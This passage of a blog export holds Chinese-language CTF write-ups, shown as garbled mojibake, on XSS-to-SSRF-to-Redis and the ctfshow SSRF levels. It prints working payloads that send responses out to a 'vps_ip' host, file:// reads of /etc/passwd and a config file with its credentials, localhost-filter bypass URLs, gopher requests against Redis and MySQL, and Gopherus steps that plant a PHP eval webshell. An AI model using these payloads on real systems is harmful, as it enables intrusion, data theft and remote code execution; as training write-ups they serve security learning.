method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;url&quot;&gt;URL&lt;/label&gt; &lt;textarea name=&quot;url&quot; class=&quot;form-control&quot; id=&quot;url&quot; aria-describedby=&quot;url&quot; placeholder=&quot;URL&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Send Request&lt;/button&gt;&lt;/form&gt; è¿˜æœ‰ setadmin.php åŒæ ·ï¼Œç»“æœ base64è§£ç  æå–å…³é”®éƒ¨åˆ† 1234567&lt;form action=&quot;/setadmin.php&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; id=&quot;username&quot; aria-describedby=&quot;username&quot; placeholder=&quot;Username&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Give Admin Access&lt;/button&gt;&lt;/form&gt; è¿™é‡Œè¯•è¯•èƒ½ä¸èƒ½é€šè¿‡ setadmin.php è®¾ç½®ç®¡ç†å‘˜ï¼Œä¹‹åæ“ä½œä¹Ÿæ–¹å¼ä¸€ç‚¹ç‚¹ã€‚ 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;setadmin.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;username=tari&quot;);&quot;&gt; å¾—åˆ°è¿”å›ä¿¡æ¯â€¦ 1&lt;div class=&quot;alert alert-warning&quot;&gt;This user is already a admin.&lt;/div&gt; é‚£ç»§ç»­é€šè¿‡è¿™ç§æ–¹å¼è·å–åˆ©ç”¨ request.php å§ï¼Œå­˜åœ¨ SSRF 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///etc/passwd&quot;);&quot;&gt; è¯»äº†ä¸€ä¸‹ /etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;falsesystemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;falsesystemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false_apt:x:104:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falsemessagebus:x:105:107::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;falsemysql:x:106:108:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;falseredis:x:107:110::&#x2F;var&#x2F;lib&#x2F;redis:&#x2F;bin&#x2F;false å‘ç° www-data è§£æç›®å½•ä¸º /var/www å¹¶ä¸”æœ‰ redis ç”¨æˆ· å°è¯•äº† /proc/self/environ å’Œ /proc/self/cmdline éƒ½æ— æ³•è·å–å‡†ç¡®çš„ web æ ¹ç›®å½•ï¼Œåªèƒ½çŒœäº†ï¼Œæ¯”å¦‚ /var/www/html ï¼ˆ è¯»å–ä¸€ä¸‹æ‰«æç›®å½•å‘ç°çš„ config.php 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; è§£ç ä¸€ä¸‹å¾—åˆ° 12345678910111213141516&lt;?php// database configdefine(&#x27;DB_USER&#x27;, &#x27;xssrf&#x27;);define(&#x27;DB_PASS&#x27;, &#x27;xssrfmeplz&#x27;);define(&#x27;DB_HOST&#x27;, &#x27;host=localhost&#x27;);define(&#x27;DB_NAME&#x27;, &#x27;xssrf&#x27;);// redis configdefine(&#x27;REDIS_HOST&#x27;, &#x27;localhost&#x27;);define(&#x27;REDIS_PORT&#x27;, 25566);// define flagdefine(&#x27;FLAG&#x27;, &#x27;FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;&#x27;);$c_hardness = 5; // how many proof of work leading zeros ç¬¬ 2 ä¸ª flag 1FLAG&#123;curl -v -o flag --next flag:&#x2F;&#x2F;in-the.redis&#x2F;the?port&#x3D;25566&amp;good&#x3D;luck&#125; è¯´å¥½çš„ç¬¬ 2 ä¸ª flag åœ¨ redis é‡Œå‘¢â€¦ xssrf redisä¸Šä¸€ä¸ª flag æç¤º redis ç«¯å£åœ¨ 25566 å…ˆè¯•è¯• gopher åè®® æœªæˆæƒæ‰“ redis 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a&quot;);&quot;&gt; redisç¯å¢ƒä¿¡æ¯è¢«æ„‰å¿«çš„æ‰“å°å‡ºæ¥ ä¾æ¬¡è·å– redis çš„é”®å’Œå€¼å³å¯ è·å–æ‰€æœ‰é”® 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a&quot;); è¯»å–ç»“æœ 12345*1$4flag åˆ¤æ–­flagé”®çš„å€¼ç±»å‹ 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a&quot;); è¯»å–ç»“æœ 1+list è·å–flagé”®çš„æ‰€æœ‰åˆ—è¡¨å€¼ 1xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%2520-1%250a&quot;); æŠŠç»“æœå¤åˆ¶è¿›å­—ç¬¦ä¸² 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221s = &quot;&quot;&quot;*53$1&#125;$1t$1i$1o$1l$1p$1x$1e$1 $1o$1t$1 $1y$1s$1a$1e$1 $1s$1i$1 $1n$1o$1i$1t$1a$1c$1i$1t$1n$1e$1h$1t$1u$1a$1 $1t$1u$1o$1h$1t$1i$1w$1 $1s$1i$1d$1e$1R$1&#123;$1G$1A$1L$1F&quot;&quot;&quot;flag = &#x27;&#x27;for c in s: flag += cprint(flag[::-1].replace(&quot;1$&quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;)) ç»“æœåœ¨å»é™¤æœ€åä¸‰ä¸ªå­—ç¬¦ 35* å³å¯ 1FLAG&#123;Redis without authentication is easy to exploit&#125; è™½ç„¶ç”Ÿäº§ç¯å¢ƒåˆ©ç”¨èµ·æ¥ç›¸å¯¹å›°éš¾ï¼Œä¸è¿‡æ¯•ç«Ÿæ˜¯CTFå˜›ï¼Œéªšæ€è·¯å¤šä¸€ä¸ªæ˜¯ä¸€ä¸ª ï¼ˆ å‚è€ƒé“¾æ¥ https://skysec.top/2018/08/17/xss-ssrf-redis/","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"hackme","slug":"ctf/hackme","permalink":"https://tari.moe/categories/ctf/hackme/"},{"name":"ctfç»ƒä¹ ","slug":"ctf/hackme/ctfç»ƒä¹ ","permalink":"https://tari.moe/categories/ctf/hackme/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"hackme","slug":"hackme","permalink":"https://tari.moe/tags/hackme/"},{"name":"ctfç»ƒä¹ ","slug":"ctfç»ƒä¹ ","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"}]},{"title":"ctfshow SSRFç¯‡","slug":"ctfshow-ssrf","date":"2021-04-25T13:14:38.000Z","updated":"2021-05-04T13:50:57.074Z","comments":true,"path":"2021/04/25/ctfshow-ssrf/","link":"","permalink":"https://tari.moe/2021/04/25/ctfshow-ssrf/","excerpt":"","text":"è¦æ˜¯å¤šç‚¹ç»„åˆæ‹³ï¼Œæˆ–è€…æ¡ä»¶è‹›åˆ»äº›å°±å¥½äº† ï¼ˆ web351 ç®€å•è®¤è¯†nginx/1.18.0 PHP/7.3.22 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; poc 12# POSTurl=http://127.0.0.1/flag.php web352 æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿnginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; åˆ†æï¼š åè®®å¿…é¡»æ˜¯ http/https ï¼Œä½†è¿‡æ»¤äº† localhost å’Œ 127.0.0 poc 1url=http://127.0.0.1/flag.php preg_match æ²¡ä¼ å‚å¯è¿˜è¡Œã€‚ã€‚å› ä¸ºæœ‰ error_reporting(0) ï¼ŒæŠ¥é”™çš„åœ°æ–¹æ’ä¸º Falseâ€¦ web353 æ•°å­—ç»•è¿‡nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127\\.0\\.|\\ã€‚/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; åˆ†æï¼š åè®®å¿…é¡»æ˜¯ http/https ï¼Œä½†è¿‡æ»¤äº† localhost å’Œ 127.0. è¿™é‡Œæœ‰è®¸å¤šç»•è¿‡ è¿›åˆ¶ç»•è¿‡ 1url=http://0x7F000001/flag.php 0.0.0.0 ç»•è¿‡ 1url=http://0.0.0.0/flag.php ipv6ç»•è¿‡ è¿™é‡Œä¸è¡Œ ç‰¹æ®Šåœ°å€ç»•è¿‡ 123url=http://0/flag.phpurl=http://127.1/flag.phpurl=http://127.0000000000000.001/flag.php è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹ ç¬¬ä¸€ä¸ª 0 åœ¨linuxç³»ç»Ÿä¸­ä¸€èˆ¬ä¼šè§£ææˆ127.0.0.1 ï¼Œåœ¨windows å’Œ macos ä¸­ä¸€èˆ¬è§£ææˆ0.0.0.0 web354 éš¾ç‚¹çš„æ•°å­—ç»•è¿‡nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|1|0|ã€‚/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; äº†è§£åˆ°ä¸€ä¸ªå¥½ç©çš„ä¸œè¥¿ IDNA ï¼Œä¸è¿‡è¿™é¢˜ç”¨ä¸ä¸Š https://www.tr0y.wang/2020/08/18/IDN/ ç„¶ååˆäº†è§£åˆ°ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œ æœ‰å…è´¹çš„ http://sudo.cc/ å¯ä»¥è§£æåˆ° 127.0.0.1 ç™½å«–ã€‚ é¢˜å¤–ï¼š è™½ç„¶ä¹Ÿå¯ä»¥ç”¨è‡ªå·±çš„åŸŸåæˆ–æœåŠ¡å™¨ï¼Œ2333 web355 é•¿åº¦é™åˆ¶nginx/1.18.0 PHP/7.3.22 1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=5))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; ä¸»æœºåéƒ¨åˆ†é•¿åº¦é™åˆ¶ï¼Œå¯ä»¥ç”¨ http://0/flag.php ä¹Ÿå¯ä»¥ç”¨ http://127.1/flag.php web356 é•¿åº¦é™åˆ¶nginx/1.18.0 PHP/7.3.22 1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=3))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; åŒ web255ï¼Œåªä¸è¿‡çŸ­äº†ç‚¹ web357 IPè¿‡æ»¤å™¨nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123; die(&#x27;scheme&#x27;);&#125;?&gt; åˆ†æï¼š å…ˆè·å–ä¸»æœºåå¯¹åº”çš„ipï¼Œç„¶åç”¨IPè¿‡æ»¤å™¨è¿›è¡Œè¿‡æ»¤ FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰ FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚ å³ï¼Œä¸»æœºåè§£æçš„ IP ä¸èƒ½æ˜¯ä¿ç•™åœ°å€æˆ–è€…æ˜¯å†…ç½‘ IPã€‚ è¿™æ—¶åˆ©ç”¨å…¬ç½‘æœåŠ¡å™¨è¿›è¡Œé‡å®šå‘å³å¯ï¼Œä¸ºäº†ä»¥åçš„é¢˜ç›® fuzz æ–¹ä¾¿ï¼Œå†™å¥½å‚æ•° 1234567&lt;?php$h_p_p = explode(&quot;@&quot;, $_GET[&#x27;h&#x27;]);$host = $h_p_p[0] or &#x27;127.0.0.1&#x27;;$port = $h_p_p[1] or &#x27;80&#x27;;$path = $h_p_p[2] or &#x27;&#x27;;header(&quot;Location: http://$host:$port/$path&quot;, TRUE, 302);?&gt; web358 ç™½åå•æ­£åˆ™nginx/1.18.0 PHP/7.3.22 12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;,$url))&#123; echo file_get_contents($url);&#125; åˆ†æï¼Œ ä¹‹å‰ä¸€ç›´æ²¡åˆ†æåˆ°è¿™ä¸ª parse_url å‡½æ•°çš„ç‰¹æ€§ï¼Œæœ‰äº›æ—¶å€™æœ‰çš„æ—¶å€™ URL ä¼šé•¿è¿™æ · è§£ææ—¶ï¼Œä¼šæŠŠ@è¿›è¡Œåˆ†å‰²ï¼Œå‰é¢æ˜¯ç”¨æˆ·ï¼Œåé¢æ˜¯ä¸»æœºåã€‚ web359 æ‰“æ— å¯†ç MySQLnginx/1.16.1 PHP/7.3.11 é¢˜ç›®æç¤º æ‰“æ— å¯†ç çš„mysql ä¸ºä»€ä¹ˆæ˜¯æ— å¯†ç å‘¢ï¼Ÿ https://paper.seebug.org/510/ MySQLå®¢æˆ·ç«¯è¿æ¥å¹¶ç™»å½•æœåŠ¡å™¨æ—¶å­˜åœ¨ä¸¤ç§æƒ…å†µï¼šéœ€è¦å¯†ç è®¤è¯ä»¥åŠæ— éœ€å¯†ç è®¤è¯ã€‚å½“éœ€è¦å¯†ç è®¤è¯æ—¶ä½¿ç”¨æŒ‘æˆ˜åº”ç­”æ¨¡å¼ï¼ŒæœåŠ¡å™¨å…ˆå‘é€saltç„¶åå®¢æˆ·ç«¯ä½¿ç”¨saltåŠ å¯†å¯†ç ç„¶åéªŒè¯ï¼›å½“æ— éœ€å¯†ç è®¤è¯æ—¶ç›´æ¥å‘é€TCP/IPæ•°æ®åŒ…å³å¯ã€‚æ‰€ä»¥åœ¨éäº¤äº’æ¨¡å¼ä¸‹ç™»å½•å¹¶æ“ä½œMySQLåªèƒ½åœ¨æ— éœ€å¯†ç è®¤è¯ï¼Œæœªæˆæƒæƒ…å†µä¸‹è¿›è¡Œï¼Œæœ¬æ–‡åˆ©ç”¨SSRFæ¼æ´æ”»å‡»MySQLä¹Ÿæ˜¯åœ¨å…¶æœªæˆæƒæƒ…å†µä¸‹è¿›è¡Œçš„ã€‚ éšä¾¿å†™ç‚¹ä¸œè¥¿ Login ä¸€ä¸‹ï¼Œç„¶åæœ‰ä¸ª returl å†™ä¸ª baiduï¼Œå‘ç°å¯ä»¥è¯·æ±‚ baidu ä¸€èˆ¬ SSRF æ‰“å†…ç½‘åº”ç”¨ä¸»è¦è¿˜æ˜¯é€šè¿‡åè®®ï¼Œæ¯”å¦‚ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ gopher å…·ä½“æ€ä¹ˆåšå‘¢ï¼Ÿ ç»†å¿ƒçš„åŒå­¦å¯èƒ½å‘ç°ï¼Œæ— è®ºæ˜¯ç”¨ gopher æ”»å‡» redisã€mysqlã€è¿˜æ˜¯ ftpï¼Œè¿™äº›ä¸»è¦éƒ½æ˜¯åŸºäº tcp åè®®ä¸ºä¸»ã€‚è¿™å’Œ gopher åè®®çš„åŸºæœ¬æ ¼å¼æœ‰å…³ 1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ å› ä¸ºï¼Œå¦‚æœæƒ³è¦æ‰“ MySQL å°±éœ€è¦çŸ¥é“ MySQL é€šä¿¡æ—¶çš„ TCP æ•°æ®æµï¼Œæ‰èƒ½çŸ¥é“è¦æ€ä¹ˆå’Œ MySQL é€šä¿¡ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡ Wireshark æŠ“åŒ…æ¥åˆ†æ å¯ä»¥å‚è€ƒä¸‹é¢é“¾æ¥çš„ 0x02 mysqlåè®®åˆ†æéƒ¨åˆ† https://www.freebuf.com/articles/web/159342.html ä¸è¿‡è¿™é‡Œæœ‰ä¸ªæ›´å¥½ç”¨çš„å·¥å…· https://github.com/tarunkant/Gopherus ä»–åŒ…å«å¸¸è§çš„åº”ç”¨ gopher æ•°æ®åŒ…çš„æ ¼å¼æ„é€ ï¼Œ åŸç†ä¹Ÿæ˜¯é€šè¿‡ Wireshark æŠ“åŒ…åˆ†æï¼Œç„¶åå†™è„šæœ¬ã€‚ 1python2 gopherus.py --exploit mysql ä¾æ¬¡è¾“å…¥ç”¨æˆ·å’Œè¦æ‰§è¡Œçš„SQLè¯­å¥ 12Give MySQL username: rootGive query to execute: select &#x27;&lt;?php eval($_GET[c]);?&gt;&#x27; into outfile &#x27;/var/www/html/c.php&#x27;; å½“ç„¶ï¼Œé™¤äº†æ»¡è¶³MySQLæœªæˆæƒå¤–ï¼Œè¿˜éœ€è¦MySQLå¼€å¯å…è®¸å¯¼å‡ºæ–‡ä»¶ä»¥åŠçŸ¥é“ç½‘ç«™æ ¹ç›®å½•ï¼Œæœ¬æ¼æ´æ‰èƒ½æˆåŠŸåˆ©ç”¨ï¼Œç¼ºä¸€ä¸å¯ã€‚ è¿™ä¸ª /var/www/html ç›®å½•æ˜¯å¦‚ä½•çŸ¥é“çš„å‘¢ï¼Ÿåº”è¯¥æ˜¯çˆ†ç ´çš„â€¦ ç”Ÿæˆçš„ POC é‡Œï¼Œ_ å­—ç¬¦åé¢çš„å†…å®¹è¿˜è¦ URLç¼–ç ä¸€æ¬¡ï¼Œå› ä¸º PHPæ¥æ”¶åˆ°POSTæˆ–GETè¯·æ±‚æ•°æ®ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡URLè§£ç ï¼Œç„¶åï¼Œæ¯”å¦‚ %00 è§£ç åï¼ŒPHPä¼šç›´æ¥æˆªæ–­ã€‚ã€‚ æœ€ç»ˆ POC ç„¶ååœ¨ c.php é‡Œé¢ cat /flag.txt å³å¯ flag ctfshow{d9cfb450-02d7-4b13-9170-4b9306d01a34} é¡ºä¾¿å«–ä¸€ä¸‹ check.php ä»£ç  ï¼ˆ 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif(isset($_POST[&#x27;returl&#x27;]))&#123; $url = $_POST[&#x27;returl&#x27;]; if(preg_match(&quot;/file|dict/i&quot;,$url))&#123; die(); &#125; echo _request(&quot;$url&quot;);&#125;function _request($curl,$https=true,$method=&#x27;get&#x27;,$data=null)&#123;$ch=curl_init(); //åˆå§‹åŒ–curl_setopt($ch,CURLOPT_URL,$curl);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);curl_setopt($ch,CURLOPT_HEADER,false);//è®¾ç½®ä¸éœ€è¦å¤´ä¿¡æ¯curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);//è·å–é¡µé¢å†…å®¹ï¼Œä½†ä¸è¾“å‡ºif($https)&#123; curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);//ä¸åšæœåŠ¡å™¨è®¤è¯ curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,FALSE);//ä¸åšå®¢æˆ·ç«¯è®¤è¯&#125;if($method==&#x27;post&#x27;)&#123; curl_setopt($ch, CURLOPT_POST,true);//è®¾ç½®è¯·æ±‚æ˜¯postæ–¹å¼ curl_setopt($ch, CURLOPT_POSTFIELDS, $data);//è®¾ç½®postè¯·æ±‚æ•°æ® &#125;$str=curl_exec($ch);//æ‰§è¡Œè®¿é—®curl_close($ch);//å…³é—­curlï¼Œé‡Šæ”¾èµ„æºreturn $str; &#125;?&gt; https://www.freebuf.com/articles/web/260806.html å½“ç„¶è¿˜å¯ä»¥æœ‰å…¶ä»–åˆ©ç”¨æ–¹å¼ï¼Œæ¯”å¦‚æ„é€  POST è¯·æ±‚è¿›è¡Œ SQLæ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰ web360 æ‰“Redisnginx/1.18.0 PHP/7.3.22 é¢˜ç›®æç¤º æ‰“redis 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œä¹Ÿæ˜¯ç”¨ Gopherus æ‰“ redis 1234What do you want?? (ReverseShell/PHPShell): PHPShellGive web root location of server (default is /var/www/html):Give PHP Payload (We have default PHP Shell): &#x27;&lt;?php eval($_GET[c]);?&gt;&#x27; URLç¼–ç ä¸€ä¸‹ _ åé¢çš„å†…å®¹ é»˜è®¤ç”Ÿæˆçš„ webshell åœ¨ shell.php ä¸­ å‘çš„åŒ…ä¼šè¶…æ—¶ï¼Œä¸è¿‡æ²¡äº‹ï¼Œshell.php æ˜¯ä¼šç”Ÿæˆçš„ã€‚ æœ€å cat /flaaag å³å¯ ä¸€äº›å‚è€ƒçš„é¢˜è§£ https://www.freebuf.com/articles/web/263512.html","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctfç»ƒä¹ ","slug":"ctf/ctfshow/ctfç»ƒä¹ ","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctfç»ƒä¹ ","slug":"ctfç»ƒä¹ 